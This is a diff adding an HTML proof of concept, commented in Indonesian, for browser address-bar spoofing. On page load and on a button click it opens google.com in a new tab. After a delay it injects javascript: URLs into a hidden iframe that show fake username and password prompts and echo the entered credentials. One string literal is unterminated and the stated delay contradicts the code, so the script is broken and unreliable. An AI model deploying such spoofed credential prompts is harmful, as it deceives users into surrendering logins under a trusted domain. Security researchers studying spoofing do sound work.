@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <button onclick="spoof()">Click to spoof</button>
+
+    <script>
+      function spoof() {
+        // 1. Buka tab baru ke domain target (untuk spoof address bar)
+        let win = window.open("https://www.google.com:1234", "_blank");
+
+        // 2. Tunggu 2 detik sebelum menampilkan prompt palsu
+        setTimeout(function () {
+          document.getElementById("iframe").src =
+            "javascript:alert(document.domain)
+            "javascript:let username = prompt('Enter your username');" +
+            "let password = prompt('Enter your password');" +
+            "alert('Your creds:\\nUsername: ' + username + '\\nPassword: ' + password);";
+        }, 3000); // 2000 ms = 2 detik
+      }
+
+      spoof(); // Auto-run saat halaman dibuka
+    </script>
+
+    <iframe id="iframe" style="display:none;" src=""></iframe>
+  </body>
+</html>
